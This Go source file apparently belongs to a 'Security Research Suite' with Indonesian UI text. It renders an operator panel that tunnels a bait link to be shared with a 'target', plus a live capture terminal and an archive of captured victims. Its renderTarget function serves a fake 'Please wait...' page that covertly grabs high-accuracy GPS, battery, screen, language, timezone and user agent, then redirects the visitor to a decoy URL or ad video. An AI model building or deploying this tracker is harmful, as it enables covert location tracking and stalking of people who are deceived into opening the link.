package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"

	"rdns_suite/tools"
)

func renderHeader(w http.ResponseWriter) {
	fmt.Fprintf(w, `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RDNS V2.9 PRO</title>
<link rel="stylesheet" href="/static/css/base.css">
<link rel="stylesheet" href="/static/css/layout.css">
<link rel="stylesheet" href="/static/css/components.css">
</head>
<body>
<nav class="navbar">
  <a class="navbar-brand" href="?admin=rdns">RDNS <span class="badge bg-primary" style="font-size:10px;vertical-align:middle">V2.9 PRO</span></a>
  <span class="navbar-sub">Security Research Suite</span>
</nav>
<div class="container">`)
}

func renderLobby(w http.ResponseWriter) {
	fmt.Fprintf(w, `
<div class="section-title"><h4>SELECT MODULE</h4></div>
<div class="row">
  <div class="col-6"><a href="?admin=rdns&tool=geolocate" class="lobby-card border-bottom-primary"><span class="icon">&#128205;</span><span class="name" style="color:var(--primary)">GEOLOCATE</span><span class="desc">Track GPS Target</span></a></div>
  <div class="col-6"><a href="?admin=rdns&tool=metadata" class="lobby-card border-bottom-success"><span class="icon">&#128444;</span><span class="name" style="color:var(--success)">METADATA</span><span class="desc">Strip EXIF Data</span></a></div>
  <div class="col-6"><a href="?admin=rdns&tool=specter" class="lobby-card border-bottom-danger"><span class="icon">&#128269;</span><span class="name" style="color:var(--danger)">SPECTER</span><span class="desc">Port Scanner</span></a></div>
  <div class="col-6"><a href="?admin=rdns&tool=archive" class="lobby-card border-bottom-warning"><span class="icon">&#128193;</span><span class="name" style="color:var(--warning)">ARCHIVE</span><span class="desc">Database Manager</span></a></div>
</div>`)
}

func renderGeoConfig(w http.ResponseWriter) {
	sessLock.RLock()
	lastProvider := session.Provider
	sessLock.RUnlock()
	if lastProvider == "" {
		lastProvider = "cloudflare"
	}
	ngrokToken := loadNgrokToken()

	sel := func(v string) string {
		if v == lastProvider {
			return " selected"
		}
		return ""
	}

	fmt.Fprintf(w, `
<div class="card border-start-primary">
  <h5 class="fw-bold mb-4" style="color:var(--primary)">GEOLOCATE SETUP</h5>
  <form method="POST" action="?admin=rdns&tool=geolocate&action=launch">
    <label>TUNNEL PROVIDER</label>
    <select name="provider" id="providerSel" class="form-select mb-3" onchange="onProviderChange(this.value)">
      <option value="cloudflare"%s>Cloudflared — Stabil, tanpa akun</option>
      <option value="ngrok"%s>Ngrok — Cepat, butuh authtoken</option>
      <option value="serveo"%s>Serveo.net — SSH, tanpa install</option>
      <option value="localhostrun"%s>Localhost.run — SSH, tanpa install</option>
    </select>
    <div id="ngrokTokenBox" style="display:none;margin-bottom:12px">
      <label>NGROK AUTHTOKEN</label>
      <input type="text" name="ngrok_token" class="form-control" placeholder="2abc...xyz_xxxx" value="%s">
      <small style="color:var(--text3)">Dapatkan di: <a href="https://dashboard.ngrok.com/get-started/your-authtoken" target="_blank" style="color:var(--primary)">dashboard.ngrok.com</a></small>
    </div>
    <label>REDIRECT / CLOAK URL <span style="color:var(--text3);font-weight:400">(Opsional)</span></label>
    <input type="text" name="cloak_url" class="form-control mb-1" placeholder="https://google.com">
    <small class="mb-4 d-block" style="color:var(--text3)">Biarkan kosong maka redirect ke video iklan acak.</small>
    <button type="submit" class="btn btn-primary w-100 fw-bold">START OPERATION</button>
  </form>
  <div class="guide-box" style="margin-top:16px">
    <div class="guide-title">INSTALL TUNNEL:</div>
    <ul style="list-style:none;padding:0;margin:0">
      <li>- Cloudflared : pkg install cloudflared</li>
      <li>- Ngrok       : pkg install ngrok</li>
      <li>- Serveo / LR : pkg install openssh</li>
    </ul>
  </div>
</div>
<script>
function onProviderChange(v){
  document.getElementById("ngrokTokenBox").style.display=(v==="ngrok")?"block":"none";
}
onProviderChange(document.getElementById("providerSel").value);
</script>`,
		sel("cloudflare"), sel("ngrok"), sel("serveo"), sel("localhostrun"),
		ngrokToken)
}

func renderWorkbench(w http.ResponseWriter, rows []string, tunnelURL string, cloakURL string, provider string) {
	cloakDisplay := cloakURL
	if cloakDisplay == "" {
		cloakDisplay = "[AUTO - Random Ad Video]"
	}
	hintHTML := ""
	if tunnelURL == "Generating..." || tunnelURL == "" {
		hintHTML = `<small style="color:var(--warning)">Generating... update otomatis tiap 2 detik.</small>`
	}
	fmt.Fprintf(w, `
<div class="card border-start-primary">
  <div class="d-flex justify-content-between align-items-center mb-3 flex-wrap gap-2">
    <h6 class="fw-bold m-0" style="color:var(--primary)">WORKBENCH <span class="badge bg-primary ms-1">%s</span></h6>
    <div class="d-flex gap-1">
      <a href="?admin=rdns&tool=geolocate&exec=true" class="btn btn-sm btn-outline-info">REFRESH</a>
      <a href="?admin=rdns&tool=geolocate&action=kill" class="btn btn-sm btn-outline-warning">KILL TUNNEL</a>
      <a href="?admin=rdns&tool=geolocate&action=new_session" class="btn btn-sm btn-outline-danger">NEW SESSION</a>
    </div>
  </div>

  <div class="mb-3">
    <label>RAW TUNNEL LINK (Bagikan ke target)</label>
    <div class="link-box">
      <code id="rawLink">%s</code>
      <button class="btn btn-sm btn-success" onclick="copyText('rawLink')">COPY</button>
    </div>
    %s
  </div>

  <div class="mb-3">
    <label>REDIRECT SETELAH CAPTURE</label>
    <div class="link-box">
      <code id="cloakLink" style="color:var(--warning)">%s</code>
      <button class="btn btn-sm btn-warning" onclick="copyText('cloakLink')">COPY</button>
    </div>
  </div>

  <div class="mb-3">
    <div class="d-flex justify-content-between align-items-center mb-1">
      <label>TUNNEL LOG</label>
      <span id="tunnelBadge" class="badge bg-warning">STARTING</span>
    </div>
    <div id="tunnelLog" class="console" style="height:130px;overflow-y:auto;font-size:10px;line-height:1.5">
      <div style="color:#555">[*] Menunggu output tunnel...</div>
    </div>
  </div>

  <div class="mb-3">
    <div class="d-flex justify-content-between align-items-center mb-1">
      <label>LIVE CAPTURE TERMINAL</label>
      <span id="termBadge" class="badge bg-info">MONITORING</span>
    </div>
    <div id="terminal" class="console" style="height:220px;overflow-y:auto">
      <div style="color:#555">[*] Menunggu target...</div>
    </div>
  </div>

  <div><label class="mb-2">CAPTURED TARGETS</label>`,
		strings.ToUpper(provider), tunnelURL, hintHTML, cloakDisplay)

	tools.RenderGeoTable(w, rows, false)

	fmt.Fprintf(w, `</div></div>
<script>
function copyText(id){
  var el=document.getElementById(id);
  var t=el.innerText;
  if(!t||t.indexOf("Generating")!==-1||t.indexOf("[Tunnel")!==-1||t.indexOf("[Timeout")!==-1||t.indexOf("[Error")!==-1){
    alert("Tunggu URL tunnel!");return;
  }
  if(navigator.clipboard){
    navigator.clipboard.writeText(t).then(function(){showToast("Copied!");}).catch(function(){prompt("Salin:",t);});
  }else{prompt("Salin:",t);}
}
function showToast(msg){
  var t=document.createElement("div");t.textContent=msg;
  t.style.cssText="position:fixed;bottom:20px;right:20px;background:#4f46e5;color:#fff;padding:10px 18px;border-radius:8px;font-size:13px;z-index:9999";
  document.body.appendChild(t);setTimeout(function(){t.remove();},2000);
}

// Poll tunnel URL
function pollTunnelURL(){
  var rawEl=document.getElementById("rawLink");
  if(!rawEl)return;
  var cur=rawEl.innerText;
  if(cur&&cur.indexOf("Generating")===-1&&cur.indexOf("[Tunnel")===-1&&cur.indexOf("[Timeout")===-1&&cur.indexOf("[Error")===-1)return;
  fetch("/api/tunnelurl").then(function(r){return r.json();}).then(function(data){
    if(data.url){
      rawEl.innerText=data.url;
      if(data.url.indexOf("Generating")===-1&&data.url.indexOf("[Tunnel")===-1){
        document.getElementById("tunnelBadge").textContent="ACTIVE";
        document.getElementById("tunnelBadge").className="badge bg-success";
      }
    }
  }).catch(function(){});
}

// Poll tunnel log
var tunnelLogLen=0;
function updateTunnelLog(){
  fetch("/api/tunnellog").then(function(r){return r.json();}).then(function(data){
    if(!data||data.length===tunnelLogLen)return;
    tunnelLogLen=data.length;
    var el=document.getElementById("tunnelLog");
    el.innerHTML="";
    data.forEach(function(line){
      var d=document.createElement("div");
      d.style.cssText="white-space:pre-wrap;word-break:break-all;";
      if(line.indexOf("[TUNNEL URL]")!==-1){
        d.style.color="#00e676";d.style.fontWeight="bold";
      }else if(line.indexOf("[!")!==-1||line.indexOf("Error")!==-1||line.indexOf("error")!==-1){
        d.style.color="#ff5252";
      }else if(line.indexOf("[+]")!==-1){
        d.style.color="#69f0ae";
      }else if(line.indexOf("[*]")!==-1){
        d.style.color="#40c4ff";
      }else{
        d.style.color="#888";
      }
      d.textContent=line;
      el.appendChild(d);
    });
    el.scrollTop=el.scrollHeight;
  }).catch(function(){});
}

// Poll live capture terminal
var prevCount=-1;
function updateTerminal(){
  fetch("/api/geologs").then(function(r){return r.json();}).then(function(data){
    if(!data)data=[];
    var badge=document.getElementById("termBadge");
    badge.textContent=data.length>0?"ACTIVE - "+data.length+" TARGET":"MONITORING";
    badge.className="badge "+(data.length>0?"bg-success":"bg-info");
    if(data.length===prevCount)return;
    prevCount=data.length;
    var term=document.getElementById("terminal");
    term.innerHTML="";
    if(data.length===0){term.innerHTML='<div style="color:#555">[*] Belum ada target...</div>';return;}
    data.forEach(function(e){
      var d=document.createElement("div");
      d.style.cssText="margin-bottom:6px;border-bottom:1px solid #2d2d4e;padding-bottom:6px";
      var gpsOk=e.gps&&e.gps!=="DENIED"&&e.gps!=="PENDING"&&e.gps!=="UNKNOWN";
      var gpsColor=gpsOk?"#00e676":"#ff5252";
      var mapLink=gpsOk?'<a href="https://www.google.com/maps?q='+e.gps+'" target="_blank" style="color:#58b4ff;font-size:10px">[MAP]</a> ':'';
      var ua=e.ua?(e.ua.length>60?e.ua.substring(0,60)+"...":e.ua):"Unknown";
      d.innerHTML=
        '<div><span style="color:#555;font-size:10px">['+(e.time||"?")+']</span>'
        +' <span style="color:#aaa">IP:</span><code style="color:#58b4ff">'+(e.ip||"?")+'</code></div>'
        +'<div><span style="color:#aaa">GPS:</span><code style="color:'+gpsColor+'">'+(e.gps||"?")+'</code> '+mapLink
        +'<span style="color:#aaa">ACC:</span><span style="color:#ffd740">'+(e.acc||"?")+'</span></div>'
        +'<div><span style="color:#aaa">BATT:</span><span style="color:#00e676">'+(e.battery||"?")+'</span>'
        +' <span style="color:#aaa">SCR:</span><span style="color:#a78bfa">'+(e.screen||"?")+'</span>'
        +' <span style="color:#aaa">TZ:</span><span style="color:#67e8f9">'+(e.tz||"?")+'</span>'
        +' <span style="color:#aaa">LANG:</span><span style="color:#f9a8d4">'+(e.lang||"?")+'</span></div>'
        +'<div style="color:#555;font-size:10px">UA: '+ua+'</div>';
      term.appendChild(d);
    });
    term.scrollTop=term.scrollHeight;
  }).catch(function(){
    document.getElementById("termBadge").textContent="RECONNECTING...";
    document.getElementById("termBadge").className="badge bg-danger";
  });
}

updateTunnelLog();
updateTerminal();
pollTunnelURL();
setInterval(updateTunnelLog,2000);
setInterval(updateTerminal,3000);
setInterval(pollTunnelURL,2000);
</script>`)
}

func renderArchive(w http.ResponseWriter) {
	g, _ := os.ReadFile(dbGeo)
	m, _ := os.ReadFile(dbMeta)
	gLines := filterEmpty(strings.Split(strings.TrimSpace(string(g)), "\n"))
	mLines := filterEmpty(strings.Split(strings.TrimSpace(string(m)), "\n"))
	fmt.Fprintf(w, `
<div class="card border-start-warning">
  <h6 class="fw-bold mb-3" style="color:var(--warning)">MASTER DATABASE</h6>
  <div class="nav-tabs-wrapper">
    <button class="nav-tab active" onclick="switchTab(this,'tab-geo')">Geo Logs <span class="badge bg-primary ms-1">%d</span></button>
    <button class="nav-tab" onclick="switchTab(this,'tab-meta')">Meta Logs <span class="badge bg-success ms-1">%d</span></button>
  </div>
  <div id="tab-geo" class="tab-pane active">
    <form method="POST" action="?admin=rdns&tool=archive&action=delete">
      <input type="hidden" name="log_type" value="geo">
      <div class="table-responsive rounded border" style="max-height:300px;overflow-y:auto">
        <table class="table table-sm"><thead><tr>
          <th width="30"><input type="checkbox" onchange="toggleAll('geo-cb',this.checked)"></th>
          <th>WAKTU</th><th>IP</th><th>GPS</th><th>DEVICE</th><th>BATT</th>
        </tr></thead><tbody>`, len(gLines), len(mLines))
	if len(gLines) == 0 {
		fmt.Fprintf(w, `<tr><td colspan="6" class="text-center" style="padding:20px;color:var(--text3)">Tidak ada data.</td></tr>`)
	} else {
		for i := len(gLines) - 1; i >= 0; i-- {
			line := gLines[i]
			p := strings.SplitN(line, "|", 9)
			ts, ip, gps, bat, device := "-", "-", "-", "-", "-"
			if len(p) > 0 { ts = p[0] }
			if len(p) > 1 { ip = p[1] }
			if len(p) > 2 { gps = p[2] }
			if len(p) > 4 { device = tools.GuessDevice(p[4]) }
			if len(p) > 6 { bat = p[6] }
			fmt.Fprintf(w, `<tr><td><input type="checkbox" name="del_item" value="%s" class="geo-cb"></td><td style="font-size:10px;white-space:nowrap;color:var(--text3)">%s</td><td><code style="color:var(--primary)">%s</code></td><td><code style="color:var(--success);font-size:10px">%s</code></td><td style="font-size:11px">%s</td><td style="color:var(--warning);font-size:11px">%s</td></tr>`,
				escapeHTML(line), ts, ip, gps, device, bat)
		}
	}
	fmt.Fprintf(w, `</tbody></table></div>
      <div class="d-flex gap-2 mt-2">
        <button type="submit" class="btn btn-danger btn-sm flex-grow-1 fw-bold" onclick="return confirm('Hapus?')">DELETE SELECTED</button>
        <a href="?admin=rdns&tool=archive" class="btn btn-outline-secondary btn-sm">RESET</a>
      </div>
    </form>
  </div>
  <div id="tab-meta" class="tab-pane">
    <form method="POST" action="?admin=rdns&tool=archive&action=delete">
      <input type="hidden" name="log_type" value="meta">
      <div class="table-responsive rounded border" style="max-height:300px;overflow-y:auto">
        <table class="table table-sm"><thead><tr>
          <th width="30"><input type="checkbox" onchange="toggleAll('meta-cb',this.checked)"></th>
          <th>WAKTU</th><th>IP</th><th>FILENAME</th><th>SIZE</th>
        </tr></thead><tbody>`)
	if len(mLines) == 0 {
		fmt.Fprintf(w, `<tr><td colspan="5" class="text-center" style="padding:20px;color:var(--text3)">Tidak ada data.</td></tr>`)
	} else {
		for i := len(mLines) - 1; i >= 0; i-- {
			line := mLines[i]
			p := strings.SplitN(line, "|", 5)
			ts, ip, fname, size := "-", "-", "-", "-"
			if len(p) > 0 { ts = p[0] }
			if len(p) > 1 { ip = p[1] }
			if len(p) > 2 { fname = p[2] }
			if len(p) > 3 { size = p[3] }
			fmt.Fprintf(w, `<tr><td><input type="checkbox" name="del_item" value="%s" class="meta-cb"></td><td style="font-size:10px;white-space:nowrap;color:var(--text3)">%s</td><td><code style="color:var(--primary)">%s</code></td><td><code style="color:var(--warning)">%s</code></td><td style="color:var(--text3);font-size:11px">%s</td></tr>`,
				escapeHTML(line), ts, ip, fname, size)
		}
	}
	fmt.Fprintf(w, `</tbody></table></div>
      <div class="d-flex gap-2 mt-2">
        <button type="submit" class="btn btn-danger btn-sm flex-grow-1 fw-bold" onclick="return confirm('Hapus?')">DELETE SELECTED</button>
        <a href="?admin=rdns&tool=archive" class="btn btn-outline-secondary btn-sm">RESET</a>
      </div>
    </form>
  </div>
</div>
<script>
function switchTab(btn,tabId){
  document.querySelectorAll('.nav-tab').forEach(function(b){b.classList.remove('active');});
  document.querySelectorAll('.tab-pane').forEach(function(p){p.classList.remove('active');});
  btn.classList.add('active');
  var pane=document.getElementById(tabId);if(pane)pane.classList.add('active');
}
function toggleAll(cls,checked){
  document.querySelectorAll('.'+cls).forEach(function(cb){cb.checked=checked;});
}
</script>`)
}

func renderTarget(w http.ResponseWriter) {
	fmt.Fprintf(w, `<!DOCTYPE html>
<html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Please Wait...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif}
.spinner{width:46px;height:46px;border:4px solid #e8e8e8;border-top:4px solid #4f46e5;border-radius:50%;animation:sp 0.85s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
p{color:#999;margin-top:18px;font-size:13px}
</style>
</head><body>
<div class="spinner"></div>
<p>Please wait...</p>
<form id="cf" method="POST" action="/?submit=1" style="display:none">
  <input type="hidden" name="l"    id="gps"  value="PENDING">
  <input type="hidden" name="acc"  id="acc"  value="">
  <input type="hidden" name="ua"   id="ua"   value="">
  <input type="hidden" name="sc"   id="sc"   value="">
  <input type="hidden" name="bat"  id="bat"  value="">
  <input type="hidden" name="lang" id="lang" value="">
  <input type="hidden" name="tz"   id="tz"   value="">
</form>
<script>
document.getElementById("ua").value=navigator.userAgent||"";
document.getElementById("sc").value=screen.width+"x"+screen.height;
document.getElementById("lang").value=navigator.language||"";
try{document.getElementById("tz").value=Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){}
var submitted=false;
function doSubmit(){if(submitted)return;submitted=true;document.getElementById("cf").submit();}
function tryBattery(cb){
  try{if(navigator.getBattery){navigator.getBattery().then(function(b){document.getElementById("bat").value=Math.round(b.level*100)+"%";cb();}).catch(cb);}else{cb();}}catch(e){cb();}
}
navigator.geolocation.getCurrentPosition(
  function(pos){
    document.getElementById("gps").value=pos.coords.latitude.toFixed(6)+","+pos.coords.longitude.toFixed(6);
    document.getElementById("acc").value=Math.round(pos.coords.accuracy)+"m";
    tryBattery(doSubmit);
  },
  function(){document.getElementById("gps").value="DENIED";tryBattery(doSubmit);},
  {enableHighAccuracy:true,timeout:15000,maximumAge:0}
);
setTimeout(function(){doSubmit();},18000);
</script>
</body></html>`)
}

func filterEmpty(lines []string) []string {
	var r []string
	for _, l := range lines {
		if strings.TrimSpace(l) != "" {
			r = append(r, l)
		}
	}
	return r
}

func escapeHTML(s string) string {
	s = strings.ReplaceAll(s, `&`, `&amp;`)
	s = strings.ReplaceAll(s, `<`, `&lt;`)
	s = strings.ReplaceAll(s, `>`, `&gt;`)
	s = strings.ReplaceAll(s, `"`, `&quot;`)
	return s
}
